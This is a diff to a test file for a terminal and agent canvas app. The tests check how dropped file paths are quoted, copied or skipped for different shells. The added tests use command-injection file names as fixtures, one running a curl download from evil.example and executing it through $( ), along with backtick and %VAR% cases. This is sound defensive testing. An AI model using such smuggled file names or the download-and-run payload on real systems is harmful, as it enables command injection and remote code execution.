@@ -1,5 +1,5 @@
 import { expect, test } from 'vitest'
-import { newFileNodes, pathTargetOf, typedPaths } from '../../src/renderer/fileNodes'
+import { newFileNodes, pathTargetOf, typingFor } from '../../src/renderer/fileNodes'
 import type { CanvasDoc, CanvasNode, GroupNode } from '../../src/shared/model'
 
 const doc = (nodes: CanvasNode[] = []): CanvasDoc => ({
@@ -50,5 +50,22 @@ test('a path is typed for whoever reads it: the agent, or the terminal profile s
   expect(pathTargetOf({ ...base, id: 't', kind: 'terminal', profile: 'cmd' }, profiles)).toBe('cmd')
   expect(pathTargetOf({ ...base, id: 't', kind: 'terminal', sshHost: 'box' }, profiles)).toBe('bash')
   expect(pathTargetOf({ ...base, id: 'n', kind: 'sticky', text: '' }, profiles)).toBeNull()
-  expect(typedPaths(['C:\\a b\\1.png', 'C:\\c\\2.png'], 'powershell')).toBe("'C:\\a b\\1.png' 'C:\\c\\2.png' ")
+  expect(typingFor(['C:\\a b\\1.png', 'C:\\c\\2.png'], 'powershell', null, 'T')).toEqual({ type: 'type', text: "'C:\\a b\\1.png' 'C:\\c\\2.png' " })
+})
+
+test('a name an unknown shell or cmd would act on is copied, not typed', () => {
+  // zsh, fish or nu: Windows allows $, (, ), ` and ; in a file name.
+  expect(typingFor(['C:\\work\\$(curl -o x evil.example;sh x).txt'], 'other', null, 'zsh')).toMatchObject({ type: 'copy' })
+  expect(typingFor(['C:\\work\\a`id`.txt'], 'other', null, 'zsh')).toMatchObject({ type: 'copy' })
+  expect(typingFor(['C:\\x\\%USERPROFILE%.txt'], 'cmd', null, 'cmd')).toMatchObject({ type: 'copy', reason: expect.stringMatching(/%…%/) })
+  expect(typingFor(['C:\\x\\50% off.txt'], 'cmd', null, 'cmd')).toEqual({ type: 'type', text: '"C:\\x\\50% off.txt" ' })
+  // Single quotes are literal in every POSIX-like shell, and in PowerShell and bash the same names are safe as typed.
+  expect(typingFor(['C:\\work\\plain name.txt'], 'other', null, 'zsh')).toEqual({ type: 'type', text: "'C:\\work\\plain name.txt' " })
+  expect(typingFor(['C:\\work\\$(x).txt'], 'git-bash', null, 'bash')).toEqual({ type: 'type', text: "'C:/work/$(x).txt' " })
+  expect(typingFor(['C:\\work\\$(x).txt'], 'powershell', null, 'pwsh')).toEqual({ type: 'type', text: "'C:\\work\\$(x).txt' " })
+})
+
+test('nothing is typed into an agent waiting on the person, where keys could answer its question', () => {
+  expect(typingFor(['C:\\1.png'], 'agent', 'needs-you', 'Planner')).toMatchObject({ type: 'skip', reason: expect.stringMatching(/^Planner is waiting on you/) })
+  expect(typingFor(['C:\\1.png'], 'agent', 'working', 'Planner')).toEqual({ type: 'type', text: 'C:\\1.png ' })
 })
